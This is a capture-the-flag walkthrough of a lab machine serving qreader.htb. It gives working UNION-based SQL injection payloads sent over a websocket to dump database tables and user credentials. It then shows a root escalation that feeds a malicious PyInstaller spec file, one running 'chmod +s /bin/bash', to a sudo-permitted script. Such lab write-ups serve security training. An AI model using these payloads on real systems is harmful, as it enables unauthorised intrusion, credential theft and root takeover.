## Enumeration

### Rustscan

sudo rustscan -t 1500 -b 1500 --ulimit 65000 -a 10.1xx.1xx.xxx -- -sV -sC -oA ./

Ports

Open 10.1xx.1xx.xxx:22

Open 10.1xx.1xx.xxx:80

Open 10.1xx.1xx.xxx:5789

Services

22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.52

|_http-title: Did not follow redirect to http://qreader.htb/

| http-methods: 

|_  Supported Methods: GET HEAD POST OPTIONS

|_http-server-header: Apache/2.4.52 (Ubuntu)

5789/tcp open  unknown syn-ack ttl 63

| fingerprint-strings: 

|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 

|     HTTP/1.1 400 Bad Request

|     Date: Sat, 25 Mar 2023 19:00:51 GMT

|     Server: Python/3.10 websockets/10.4

|     Content-Length: 77

|     Content-Type: text/plain

|     Connection: close

|     Failed to open a WebSocket connection: did not receive a valid HTTP request.

|   Help: 

|     HTTP/1.1 400 Bad Request

|     Date: Sat, 25 Mar 2023 19:01:06 GMT

|     Server: Python/3.10 websockets/10.4

|     Content-Length: 77

|     Content-Type: text/plain

|     Connection: close

|     Failed to open a WebSocket connection: did not receive a valid HTTP request.

|   SSLSessionReq:

|     HTTP/1.1 400 Bad Request

|     Date: Sat, 25 Mar 2023 19:01:07 GMT

|     Server: Python/3.10 websockets/10.4

|     Content-Length: 77

|     Content-Type: text/plain

|     Connection: close

|_    Failed to open a WebSocket connection: did not receive a valid HTTP request.

Foothold

First things first, added qreader.htb to my /etc/hosts file.

After that I started to analyze webpage which does pretty much just two basic things:

Generate a QR Code based on a string that you provide

Read a QR Code in various image formats and display it’s content

Beside that there were two download links one for a linux application and one for windows.

Exploitation

For the next steps you would need to have python38 otherwise you could run into some issues.

Decompile Application

# Convert App to pyc

pyi-archive_viewer qreader

? X qreader

to filename? ./qreader.pyc


# Decompyle pyc using uncompyle

uncompyle6 qreader.pyc > qreader.py

Source Analysis

I removed erverything except the interesting parts.

We find an URL which points to the websocket service running on port 5789 and a function “version” that will send some data to that port to receive an answer.

...

ws_host = 'ws://ws.qreader.htb:5789'

...

    def version(self):
    
        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
        
            'version': VERSION })))
            
        data = json.loads(response)
        
        if 'error' not in data.keys():
        
            version_info = data['message']
            
            msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''
            
            self.statusBar().showMessage(msg)
            
            return None
            
        error = None['error']
        
        self.statusBar().showMessage(error)
        
...

I’ve already seen SQL Injections over websocket in the past so that was something that came to my mind

###SQL Injection

ws_cli.py

I changed the query paramter during my tests


from websocket import create_connection

import sys, json

ws_host = 'ws://ws.qreader.htb:5789'

VERSION = '0.0.2'

ws = create_connection(ws_host + '/version')

ws.send(json.dumps({'version': VERSION}))

result = ws.recv()

print(result)

ws.close()


Simple Check

python3 ws_cli.py

Sending...

Sent

Receiving...

Received '{"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}'

Check SQLi

# query='0.0.3" UNION SELECT 1,2,3,4-- -''

Sending...

Sent

Receiving...

Received '{"message": {"id": 1, "version": 2, "released_date": 3, "downloads": 4}}'

Check which DB


# Played around and sqlite was the way to go!

# query='0.0.3" UNION SELECT sqlite_version(),2,3,4-- -'

Sending...

Sent

Receiving...

Received '{"message": {"id": "3.37.2", "version": 2, "released_date": 3, "downloads": 4}}'

Get Tables and Infos


# Getting Tables

## query='0.0.3" UNION SELECT group_concat(name),2,3,4 from sqlite_schema-- -'

Sending...

Sent

Receiving...

Received '{"message": {"id": "sqlite_sequence,versions,users,info,reports,answers", "version": 2, "released_date": 3, "downloads": 4}}'

# Getting Column Names

## query='0.0.3" UNION SELECT sql,2,3,4 from sqlite_master WHERE type!="meta" AND sql NOT NULL AND name ="users"-- -'

Sending...

Sent

Receiving...

Received '{"message": {"id": "CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password DATE, role TEXT)", "version": 2, "released_date": 3, "downloads": 4}}'

## query='0.0.3" UNION SELECT sql,2,3,4 from sqlite_master WHERE type!="meta" AND sql NOT NULL AND name ="answers"-- -'

Sending...

Sent

Receiving...

Received '{"message": {"id": "CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT,  answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))", "version": 2, "released_date": 3, "downloads": 4}}'

# Getting Content of Columns

## query='0.0.3" UNION SELECT username,password,3,4 from users-- -'

Sending...

Sent

Receiving...


Received '{"message": {"id": "admin", "version": "CENSORED", "released_date": 3, "downloads": 4}}'


## query='0.0.3" UNION SELECT group_concat(answered_by),group_concat(answer),3,4 from answers-- -'

Sending...

Sent

Receiving...

Received '{"message": {"id": "admin,admin", "version": "Hello Json,\n\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\n\nThomas Keller,Hello Mike,\n\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\n\nThomas Keller", "released_date": 3, "downloads": 4}}'

##SSH

This one was a bit tricky. The hash found could be easily cracked using https://crackstation.net/. The username wasn’t that simple at first.

Checking the answers table revealed that the admin is named Thomas Keller. So let’s assume a standard naming convention which could be either thomask or tkeller.

#tkeller was the right name

ssh tkeller@qreader.htb

Escalation
## Local Enumeration


sudo -l


User tkeller may run the following commands on socket:

    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
    
build-installer.sh

#!/bin/bash

if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then

  /usr/bin/echo "No enough arguments supplied"
  
  exit 1;
  
fi


action=$1

name=$2

ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')


if [[ -L $name ]];then

  /usr/bin/echo 'Symlinks are not allowed'
  
  exit 1;
  
fi

if [[ $action == 'build' ]]; then

  if [[ $ext == 'spec' ]] ; then
  
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    
    /home/svc/.local/bin/pyinstaller $name
    
    /usr/bin/mv ./dist ./build /opt/shared
    
  else
  
    echo "Invalid file format"
    
    exit 1;
    
  fi
  
elif [[ $action == 'make' ]]; then

  if [[ $ext == 'py' ]] ; then
  
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
    
   /usr/bin/mv ./dist ./build /opt/shared
   
  else
  
    echo "Invalid file format"
    
    exit 1;
    
  fi
  
elif [[ $action == 'cleanup' ]]; then

  /usr/bin/rm -r ./build ./dist 2>/dev/null
  
  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
  
  /usr/bin/rm /tmp/qreader* 2>/dev/null
  
else

  /usr/bin/echo 'Invalid action'
  
  exit 1;
  
fi

## Exploitation


As you can see we run the build-installer.sh as root which means we can inject our own commands to it and have them run as root. I had to read this up but pyinstaller just literally executes the the file which I provided to it.

So instead of giving a valid spec file I created little snippet that modifies /bin/bash

import os

os.system("chmod +s /bin/bash")

Let’s execute


tkeller@socket:/tmp$ sudo /usr/local/sbin/build-installer.sh build my.spec

128 INFO: PyInstaller: 5.6.2

128 INFO: Python: 3.10.6

131 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35

136 INFO: UPX is not available.

tkeller@socket:/tmp$ ls -al /bin/bash

-rwsr-sr-x 1 root root 1396520 Mar 26 01:26 /bin/bash

## Root


tkeller@socket:/tmp$ bash -p

bash-5.1# whoami

root

bash-5.1# ls /root

cleanup  root.txt  snap

